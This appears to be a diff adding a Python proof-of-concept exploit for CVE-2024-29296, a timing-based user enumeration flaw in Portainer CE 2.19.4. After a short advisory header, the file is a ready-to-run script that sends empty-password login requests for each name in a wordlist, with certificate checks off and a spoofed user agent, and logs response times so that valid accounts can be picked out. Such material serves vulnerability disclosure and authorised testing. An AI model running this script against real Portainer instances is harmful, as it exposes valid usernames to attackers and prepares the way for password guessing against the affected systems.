@@ -1,0 +1,81 @@
+'''
+CVE-2024-29296
+POC Author: Lavender-exe
+
+---
+
+Vulnerability: User enumeration
+Vendor of Product: Portainer
+Affected Product Code Base: Portainer CE - 2.19.4
+Attack Type: Remote
+Impact Information Disclosure: True
+Attack Vectors: To exploit the vulnerability, someone must send several login requests for multiple usernames and check the response times. The response time for valid users is noticeably larger.
+Discoverer: Thayse Marques Solis
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3)
+CWE-208: Observable Timing Discrepancy
+'''
+
+
+import requests
+import urllib3
+import time
+import logging
+from rich.logging import RichHandler
+
+logging.basicConfig(
+    level="INFO", 
+    format="%(message)s",
+    datefmt="[%X]",
+    handlers=[
+        RichHandler(rich_tracebacks=False),
+        logging.FileHandler(filename='response_time.txt', mode='w', encoding="utf-8"),
+    ],
+)
+
+log = logging.getLogger("rich")
+session = requests.Session()
+urllib3.disable_warnings()
+
+def post_request(username_file, target_url: str) -> str:
+    '''
+    Request:  Sends a list of possible usernames
+    Response: Logs response times in response_time.txt
+
+    usernames   : file
+    post_url    : str
+    post_data   : [dict]
+    post_header : [dict]
+    '''
+    with open(file=username_file, mode='r', encoding='utf-8') as usernames:
+
+        for username in usernames:
+            username = username.strip()
+
+            post_url = target_url
+            post_data = {
+                "username":f"{username}",
+                "password":""
+            }
+            post_header = {
+                "Content-Type":"application/json",
+                "User-Agent":"WhatsApp/2.2407.10 W",
+            }
+
+            start_time = time.perf_counter()
+
+            send_request = session.post(url=post_url, data=post_data, headers=post_header, 
+                                        verify=False, allow_redirects=True)
+
+            request_time = time.perf_counter() - start_time
+            logging.info(f"Request for {username} completed in {request_time}")
+
+
+if __name__ == "__main__":
+    try:
+        input_url = input("Enter Target URL: ")
+        input_username = input("Enter Username List: ")
+
+        post_request(username_file=input_username, target_url=input_url)
+        print("Check response_time.txt - Look for the slowest request time")
+    except Exception as e:
+        print(f"Error Caught: {e=}")
